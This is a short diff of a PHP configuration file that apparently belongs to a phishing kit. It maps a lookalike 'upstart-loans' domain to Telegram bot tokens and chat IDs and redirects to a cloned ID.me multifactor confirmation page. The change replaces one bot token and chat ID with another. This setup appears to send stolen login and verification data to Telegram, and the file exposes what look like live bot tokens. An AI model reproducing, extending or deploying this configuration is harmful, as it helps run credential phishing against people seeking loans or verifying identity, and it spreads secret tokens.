@@ -42,7 +42,7 @@ $site_map = [
     'upstart-loans.rf.gd' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '7956417008:AAE_AajDMFr5uyaWrObRwXSRCsXXDeAlBuQ', 'chat_id' => '1566821522']
+            ['token' => '7797738217:AAG_PAbslwMCUjOjknuXbuDKhve87D0E0yM', 'chat_id' => '7336413391']
 
         ],
         'redirect' => 'https://upstart-loans.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
